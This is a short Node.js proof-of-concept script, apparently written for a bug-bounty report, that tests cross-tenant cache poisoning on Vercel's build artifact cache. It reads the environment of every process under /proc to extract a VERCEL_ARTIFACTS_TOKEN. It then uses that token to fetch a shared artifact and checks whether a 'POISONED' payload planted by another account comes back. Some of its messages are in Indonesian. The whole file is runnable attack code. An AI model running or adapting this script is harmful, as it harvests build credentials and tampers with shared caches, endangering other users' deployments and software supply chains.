const fs = require('fs');

async function runVictimPoC() {
    console.log("\n[#] === VERCEL CACHE POISONING: VICTIM SIDE ===");

    let token = null;
    try {
        const pids = fs.readdirSync('/proc').filter(p => !isNaN(p));
        for (const pid of pids) {
            const environPath = `/proc/${pid}/environ`;
            if (fs.existsSync(environPath)) {
                const environ = fs.readFileSync(environPath, 'utf8');
                if (environ.includes('VERCEL_ARTIFACTS_TOKEN=')) {
                    token = environ.split('VERCEL_ARTIFACTS_TOKEN=')[1].split('\0')[0];
                    console.log(`[!] Extracted Token from PID ${pid}`);
                    break;
                }
            }
        }
    } catch (e) { console.log("[-] Error reading /proc:", e.message); }

    if (!token) return console.log("[-] Token not found. Build Akun B gagal dapet token.");

    const SHARED_HASH = "h1_cross_deploy_poc_999"; 
    const url = `https://api.vercel.com/v8/artifacts/${SHARED_HASH}`;

    console.log(`[*] Attempting to fetch shared artifact: ${SHARED_HASH}`);

    try {
        const res = await fetch(url, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

        console.log(`[?] Response Status: ${res.status} ${res.statusText}`);

        if (res.status === 200) {
            const data = await res.text();
            console.log(`\n[!] DATA RECEIVED: "${data}"`);

            if (data.includes("POISONED")) {
                console.log("\n CACHE POISONING SUCCESSFUL!");
                console.log("[!] Account B (Victim) has successfully pulled the malicious payload from the cache.");
                console.log("[!] This proves Cross-Deployment/Cross-User Integrity Violation.");
            } else {
                console.log("\n Data received, but it's not the poisoned payload.");
            }
        } else if (res.status === 404) {
            console.log("\n[-] Cache Miss (404). Akun B nggak bisa liat barang milik Akun A.");
            console.log("[i] Ini artinya isolasi Vercel antar-tenant masih jalan.");
        } else if (res.status === 403) {
            console.log("\n[-] Forbidden (403). Akses ditolak oleh Gateway.");
        }

    } catch (err) {
        console.log(`[!] Error during fetch: ${err.message}`);
    }

    console.log("\n[#] Victim PoC finished.");
    await new Promise(r => setTimeout(r, 5000));
}

runVictimPoC();
